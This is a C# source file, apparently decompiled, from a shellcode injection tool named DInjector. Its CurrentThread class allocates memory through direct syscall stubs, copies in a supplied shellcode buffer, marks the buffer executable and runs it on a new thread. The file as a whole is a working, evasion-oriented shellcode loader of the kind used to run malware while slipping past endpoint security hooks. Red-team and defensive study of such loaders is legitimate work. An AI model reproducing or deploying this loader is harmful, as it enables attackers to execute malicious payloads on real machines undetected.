using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x0200000B RID: 11
	internal class CurrentThread
	{
		// Token: 0x06000029 RID: 41 RVA: 0x000038FC File Offset: 0x00001AFC
		public static void Execute(byte[] shellcodeBytes)
		{
			CurrentThread.NtAllocateVirtualMemory ntAllocateVirtualMemory = (CurrentThread.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAllocateVirtualMemory"), typeof(CurrentThread.NtAllocateVirtualMemory));
			IntPtr zero = IntPtr.Zero;
			IntPtr intPtr = (IntPtr)shellcodeBytes.Length;
			DInvoke.Data.Native.NTSTATUS ntstatus = ntAllocateVirtualMemory(Process.GetCurrentProcess().Handle, ref zero, IntPtr.Zero, ref intPtr, Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, 4U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {0}", ntstatus));
			}
			Marshal.Copy(shellcodeBytes, 0, zero, shellcodeBytes.Length);
			uint num;
			ntstatus = ((CurrentThread.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(CurrentThread.NtProtectVirtualMemory)))(Process.GetCurrentProcess().Handle, ref zero, ref intPtr, 32U, out num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			CurrentThread.NtCreateThreadEx ntCreateThreadEx = (CurrentThread.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtCreateThreadEx"), typeof(CurrentThread.NtCreateThreadEx));
			IntPtr zero2 = IntPtr.Zero;
			ntstatus = ntCreateThreadEx(out zero2, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, Process.GetCurrentProcess().Handle, zero, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
			}
			else
			{
				Console.WriteLine(string.Format("(CurrentThread) [-] NtCreateThreadEx: {0}", ntstatus));
			}
			ntstatus = ((CurrentThread.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWaitForSingleObject"), typeof(CurrentThread.NtWaitForSingleObject)))(zero2, false, 0U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
				return;
			}
			Console.WriteLine(string.Format("(CurrentThread) [-] NtWaitForSingleObject: {0}", ntstatus));
		}

		// Token: 0x02000039 RID: 57
		// (Invoke) Token: 0x06000076 RID: 118
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

		// Token: 0x0200003A RID: 58
		// (Invoke) Token: 0x0600007A RID: 122
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x0200003B RID: 59
		// (Invoke) Token: 0x0600007E RID: 126
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

		// Token: 0x0200003C RID: 60
		// (Invoke) Token: 0x06000082 RID: 130
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtWaitForSingleObject(IntPtr ObjectHandle, bool Alertable, uint Timeout);
	}
}
